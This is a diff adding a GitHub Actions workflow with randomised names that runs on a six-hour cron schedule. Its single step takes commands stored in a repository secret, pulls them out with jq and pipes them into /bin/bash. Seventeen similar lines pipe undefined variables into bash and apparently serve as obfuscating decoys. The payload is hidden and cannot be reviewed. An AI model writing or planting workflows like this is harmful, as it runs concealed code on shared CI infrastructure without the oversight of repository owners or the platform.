@@ -1,0 +1,36 @@
+name: chenhejiu6189
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenhejiu6189
+        env:
+          v4: ${{ secrets.v4 }}
+        run: |
+          echo $v4 | jq -r .fglm33012 | /bin/bash
+          echo $wrn01 | jq -r .xg1340 | /bin/bash
+          echo $huqv45659 | jq -r .ax5 | /bin/bash
+          echo $yhi8210 | jq -r .bnld3533 | /bin/bash
+          echo $yyt938 | jq -r .ti20085 | /bin/bash
+          echo $lgcy10 | jq -r .y493 | /bin/bash
+          echo $el111 | jq -r .dqb241 | /bin/bash
+          echo $y88159 | jq -r .k2 | /bin/bash
+          echo $wr46960 | jq -r .gsxoz97206 | /bin/bash
+          echo $qdei3845 | jq -r .oy63840 | /bin/bash
+          echo $au4751 | jq -r .sdei4 | /bin/bash
+          echo $bw7 | jq -r .tj80813 | /bin/bash
+          echo $khrac34 | jq -r .xmlq06776 | /bin/bash
+          echo $jv5066 | jq -r .mch05 | /bin/bash
+          echo $gmard21035 | jq -r .xpja18691 | /bin/bash
+          echo $cpng469 | jq -r .oikh8730 | /bin/bash
+          echo $wts8194 | jq -r .ob732 | /bin/bash
+          echo $q17454 | jq -r .irmne23170 | /bin/bash
+
